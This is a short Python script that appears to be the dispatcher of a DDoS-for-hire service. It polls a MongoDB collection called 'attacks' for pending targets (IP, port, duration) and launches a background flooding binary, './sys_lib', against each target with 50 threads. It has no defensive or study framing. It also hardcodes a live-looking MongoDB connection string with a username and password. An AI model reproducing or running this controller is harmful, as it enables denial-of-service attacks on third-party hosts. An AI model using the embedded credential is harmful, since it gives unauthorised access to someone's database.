import pymongo
import os
import time
import subprocess

MONGO_URL = "mongodb+srv://pramil:cSnJK0jIZ9FSfIAF@cluster0.ycf4z0g.mongodb.net/?retryWrites=true&w=majority"
client = pymongo.MongoClient(MONGO_URL)
db = client['v43_db']
collection = db['attacks']

def run_monitor():
    print("🚀 V43 ENGINE ACTIVE: Parallel Mode Enabled")
    while True:
        try:
            # Ek saath saare pending tasks uthana
            tasks = collection.find({"status": "pending"})
            for task in tasks:
                ip = task['ip']
                port = task['port']
                duration = task['time']
                
                # Status update taaki engine dobara na uthaye
                collection.update_one({"_id": task["_id"]}, {"$set": {"status": "running"}})
                
                print(f"🔥 Launching Parallel Attack: {ip}:{port}")
                
                # 'subprocess.Popen' background mein chalayega (Non-blocking)
                subprocess.Popen(["./sys_lib", str(ip), str(port), str(duration), "50"], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Note: Aap manually status 'completed' kar sakte hain timer ke baad
            time.sleep(2)
        except Exception as e:
            print(f"❌ Engine Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    run_monitor()